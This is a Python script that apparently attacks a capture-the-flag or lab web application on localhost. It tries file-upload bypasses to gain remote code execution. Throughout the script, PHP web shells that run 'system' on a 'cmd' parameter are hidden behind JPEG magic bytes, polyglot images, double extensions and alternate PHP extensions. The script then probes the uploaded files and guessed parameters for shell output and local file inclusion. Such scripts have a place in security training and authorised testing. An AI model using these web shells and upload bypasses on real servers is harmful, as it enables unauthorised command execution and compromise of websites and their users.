import requests
import os

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Upload .php file with JPEG header bypass
print("[*] TEST 1: PHP file with JPEG magic bytes")
php_jpeg = b'\xff\xd8\xff\xe0\x00\x10JFIF' + b'<?php system($_GET["cmd"]); ?>'
files = {'userfile': ('shell.php.jpg', php_jpeg, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Check if PHP executed
r = requests.get(f"{base_url}/upload/shell.php.jpg", params={'cmd': 'id'})
print(f"[+] Shell check: {r.status_code}")
if 'uid=' in r.text:
    print("[!] RCE FOUND!")
    print(r.text)

# Test 2: Try to upload as .php directly with JPEG header
print("\n[*] TEST 2: Upload .php extension with JPEG header")
files = {'userfile': ('test.php', php_jpeg, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Test 3: Create .phar file (PHP archive that can contain executable code)
print("\n[*] TEST 3: Try .phar with JPEG header")
phar_stub = b'\xff\xd8\xff\xe0' + b'<?php __HALT_COMPILER(); ?>'
files = {'userfile': ('test.phar.jpg', phar_stub, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Test 4: Try to use image/pjpeg MIME type
print("\n[*] TEST 4: Try pjpeg MIME type")
files = {'userfile': ('pjpeg.php.jpg', php_jpeg, 'image/pjpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Test 5: Create PHP file with polyglot JPEG/PHP
print("\n[*] TEST 5: Upload real JPEG with PHP at end")
jpeg_with_php = create_minimal_jpeg() + b'<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
files = {'userfile': ('polyglot.php.jpg', jpeg_with_php, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {response.text[:500]}")

# Try to access as .php
r = requests.get(f"{base_url}/upload/polyglot.php.jpg", params={'cmd': 'id'})
print(f"[+] polyglot.php.jpg: {r.status_code}")
if 'uid=' in r.text:
    print("[!] RCE!")

r = requests.get(f"{base_url}/upload/polyglot.php", params={'cmd': 'id'})
print(f"[+] polyglot.php: {r.status_code}")

# Test 6: Check if there's a file inclusion in index.php
print("\n[*] TEST 6: Try LFI via various parameters")
# Upload a shell first
shell_jpeg = create_minimal_jpeg() + b'<?php system("env"); ?>'
files = {'userfile': ('env.jpg', shell_jpeg, 'image/jpeg')}
requests.post(f"{base_url}/index.php", files=files)

# Try to trigger inclusion
lfi_params = [
    {'file': 'upload/env.jpg'},
    {'page': 'upload/env.jpg'},
    {'img': 'upload/env.jpg'},
    {'image': 'upload/env.jpg'},
    {'load': 'upload/env.jpg'},
    {'include': 'upload/env.jpg'},
]

for params in lfi_params:
    r = requests.get(f"{base_url}/index.php", params=params)
    if 'FLAG' in r.text or 'PATH=' in r.text or 'HOME=' in r.text:
        print(f"[!] LFI FOUND with params: {params}")
        print(r.text)

# Test 7: Try to trigger via HTTP Accept header (content negotiation)
print("\n[*] TEST 7: Try content negotiation")
headers = {'Accept': 'image/jpeg'}
r = requests.get(f"{base_url}/upload/env.jpg", headers=headers)
print(f"[+] Status: {r.status_code}")

# Test 8: Check for PHP execution via mod_php misconfiguration
print("\n[*] TEST 8: Try different extensions with JPEG header")
extensions = ['php3', 'php4', 'php5', 'php7', 'phtml', 'pht', 'phps', 'inc']
for ext in extensions:
    files = {'userfile': (f'test.{ext}.jpg', php_jpeg, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    if 'successfully uploaded' in r.text:
        # Try to access
        r2 = requests.get(f"{base_url}/upload/test.{ext}.jpg", params={'cmd': 'id'})
        if 'uid=' in r2.text:
            print(f"[!] RCE via .{ext}.jpg!")

# Test 9: Try file with .php.jpg to see if Apache strips .jpg
print("\n[*] TEST 9: Test Apache extension handling")
# Upload a JPEG with PHP extension and check if Apache processes it
files = {'userfile': ('test.php.jpg', jpeg_with_php, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
if 'successfully uploaded' in response.text:
    # Try accessing with different extensions removed
    test_urls = [
        f"{base_url}/upload/test.php.jpg",
        f"{base_url}/upload/test.php",
    ]
    for url in test_urls:
        r = requests.get(url, params={'cmd': 'id'})
        print(f"[+] {url}: {r.status_code}")
        if 'uid=' in r.text:
            print("[!] RCE!")

# Test 10: Check if PHP file in upload dir gets executed
print("\n[*] TEST 10: Try to create index.php in upload directory")
# Upload a file named index.php.jpg and see if we can access upload/ with it as index
index_php = create_minimal_jpeg() + b'<?php system("env"); ?>'
files = {'userfile': ('index.php.jpg', index_php, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)

# Access the upload directory - might trigger index.php.jpg
r = requests.get(f"{base_url}/upload/")
print(f"[+] Upload dir: {r.status_code}")
print(f"[+] Response: {r.text[:500]}")

# Try accessing as index.php directly
r = requests.get(f"{base_url}/upload/index.php")
print(f"[+] upload/index.php: {r.status_code}")

